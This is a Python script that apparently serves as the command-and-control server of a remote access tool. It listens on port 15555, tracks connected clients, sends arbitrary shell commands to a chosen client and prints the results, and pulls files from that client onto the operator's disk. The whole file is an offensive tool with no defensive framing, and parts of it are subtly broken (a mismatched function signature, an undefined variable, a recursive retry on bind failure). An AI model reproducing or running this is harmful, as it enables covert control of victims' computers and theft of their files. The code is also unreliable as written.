import socket
import threading

host = ''
port = 15555

connect_list = []
address_list = []

s = socket.socket()

def close():
    
    try:
        
        s.bind((host, port))

        s.listen(5)

    except:
    
        print('error connect')
    
        close()

def accept():
    
    while True:
        try:
            
            connecting,adres = s.accept()
            connect_list.append(connecting)
            address_list.append(adres)

        except:

            print('connecting hatasi')


def main_shell():
    while True:
        command = input("command:")
        try:

            if command == 'sorting':
                sorting()

            elif 'closen' in command:
                try:
                    
                    enter_number = int(command[-1])

                    connecting = closen(enter_number)

                    if connecting:

                        request_input = input('what do you want: ')

                        if request_input == 'cmd':

                            connecting.send('cmd'.encode('utf-8'))
                            
                            command_yolla(connecting)

                        elif request_input == 'file':

                            connecting.send(request_input.encode('utf-8'))

                            file_transfer(connecting)

                        else:

                            print('error')

                except ValueError:

                    print('only num')

                else:
                    print('error')
        except:

            print('error...')


def sorting():
    
    print('-----Clients-----\n')    

    for index, connecting in enumerate(connect_list):
        try:

            connecting.send(b' ')
            connecting.recv(1024)

        except:

            connect_list.pop(index)
            address_list.pop(index)
            continue

        print(str(index) + ' ' + address_list[index][0] + ' ' + str(address_list[index][1]))


def closen(index):
    try:

        connecting = connect_list[index]

        print(address_list[index][0] + ' you are connected to the ip address...')

        return connecting

    except:

        print('invalid connection')

        return False


def command_yolla(connecting):

    while True:

        cmd = input('what is code: ')

        if cmd == 'quit':
            connecting.send('quit'.encode('utf-8'))
            break

        if len(cmd) > 0:

            connecting.send(cmd.encode('utf-8'))

            answer = connecting.recv(4096).decode('utf-8')

            print(answer)


def file_transfer():

    location = input('file location:')
    
    connecting.send(accepting.encode('utf-8'))

    size = int(connecting.recv(1024).decode('utf-8'))

    connecting.send(b' ')

    incoming_size = 0

    ad = input('file name: ')

    d_p = 'C:/Users/'

    with open(d_p+ad, 'wb') as file:

        while True:

            data = connecting.recv(1024)
            incoming_size += len(data)
            file.write(data)

            if incoming_size >= size:
                break
        print('The file transfer was successful.')

close()

shell = threading.Thread(target = main_shell)
accept = threading.Thread(target = accept)

shell.start()
accept.start()


